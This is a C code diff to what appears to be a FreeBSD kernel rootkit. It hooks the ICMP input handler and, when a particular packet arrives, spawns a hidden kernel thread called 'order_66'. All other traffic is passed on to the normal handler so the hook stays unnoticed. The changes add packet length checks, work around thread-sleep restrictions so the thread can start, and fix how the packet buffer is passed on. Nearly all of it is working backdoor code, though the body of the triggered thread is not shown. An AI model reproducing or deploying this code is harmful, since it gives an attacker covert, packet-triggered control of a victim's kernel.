@@ -301,12 +301,32 @@ static void order_66() {
    kthread_exit();
 }
 
-pr_input_t   icmp_input_order_66;
+pr_input_t icmp_input_order_66;
 /* icmp_input hook. */
 int icmp_input_order_66(struct mbuf **m, int *off, int proto) {
-   struct icmp     *icp;
-   int         hlen = *off;
-   struct mbuf    *mbuf = *m;
+   struct icmp *icp;
+   struct mbuf *mbuf = *m;
+   int hlen = *off;
+   // Get the IP header
+   struct ip *ip = mtod(mbuf, struct ip *);
+   // Get the length of the ICMP portion of the packet
+   int icmplen = ntohs(ip->ip_len) - *off;
+   *m = NULL;
+   int i;
+
+   // Verify that it is at least the minimum length
+   if (icmplen < ICMP_MINLEN) {
+      m_freem(mbuf);
+      return (IPPROTO_DONE);
+   }
+
+   i = hlen + min(icmplen, ICMP_ADVLENMIN);
+
+   if (mbuf->m_len < i && (mbuf = m_pullup(mbuf, i)) == NULL)  {
+      return (IPPROTO_DONE);
+   }
+
+   ip = mtod(mbuf, struct ip *);
    /* Locate the ICMP message within m. */
    mbuf->m_len -= hlen;
    mbuf->m_data += hlen;
@@ -373,21 +393,37 @@ int icmp_input_order_66(struct mbuf **m, int *off, int proto) {
       sx_xunlock(&stk_xfer_lock);
 
       struct thread *order_66_thread;
+
       struct kthread_desc kd = {
          "order_66",
          order_66,
          &order_66_thread
       };
 
-   kthread_start(&kd);
+      bool disable_sleeping = false;
+
+      // If the current thread isn't allowed to sleep, enable sleeping and set a
+      // flag to undo after starting a new thread.
+      if (!THREAD_CAN_SLEEP()) {
+         THREAD_SLEEPING_OK();
+         disable_sleeping = true;
+      }
+
+      kthread_start(&kd);
+
+      // Disable sleeping if the current thread was not allowed to sleep
+      if (disable_sleeping) {
+         THREAD_NO_SLEEPING();
+      }
+
 #ifdef DEBUG
-    printf("[-] kthread_start called\n");
+       printf("[-] kthread_start called\n");
 #endif
    } else {
 #ifdef DEBUG
       printf("[-] normal packet found\n");
 #endif
-      return icmp_input(m, off, proto);
+      return icmp_input(&mbuf, off, proto);
    }
    return 0;
 }
